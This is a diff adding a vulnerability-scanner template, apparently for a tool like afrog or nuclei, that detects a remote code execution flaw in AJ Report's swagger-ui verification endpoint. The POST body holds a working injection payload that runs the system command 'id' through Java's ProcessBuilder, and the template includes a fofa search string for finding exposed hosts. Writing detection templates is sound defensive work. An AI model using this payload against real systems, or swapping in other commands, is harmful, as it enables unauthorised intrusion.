@@ -1,0 +1,24 @@
+id: aj-report-swagger-ui-rce
+
+info:
+  name: AJ Report 开源数据大屏 verification swagger-ui RCE
+  author: zan8in
+  severity: critical
+  verified: false
+  description: |
+    AJ Report 开源数据大屏 verification swagger-ui 存在RCE漏洞，攻击者可以通过该漏洞执行任意命令。
+    fofa: app="AJ-Report"
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-999999
+  tags: aj-report,rce,swagger-ui
+  created: 2025/11/13
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /dataSetParam/verification;swagger-ui/
+      body: |
+        {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
